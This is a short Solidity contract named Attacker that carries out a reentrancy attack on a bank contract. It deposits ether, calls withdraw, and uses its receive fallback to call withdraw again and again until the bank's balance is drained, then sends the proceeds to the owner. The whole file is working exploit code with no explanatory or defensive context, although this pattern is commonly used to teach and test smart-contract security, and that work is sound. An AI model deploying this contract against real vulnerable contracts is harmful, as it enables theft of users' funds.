// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker is Ownable {
    IBank public immutable i_bank;

    constructor(address _bank) {
        i_bank = IBank(_bank);
    }

    function attack() external payable onlyOwner {
        //Deposit
        i_bank.deposit{value: msg.value}();
        //Withdraw
        i_bank.withdraw();
    }

    //Receive
    receive() external payable {
        if (address(i_bank).balance > 0) {
            i_bank.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}
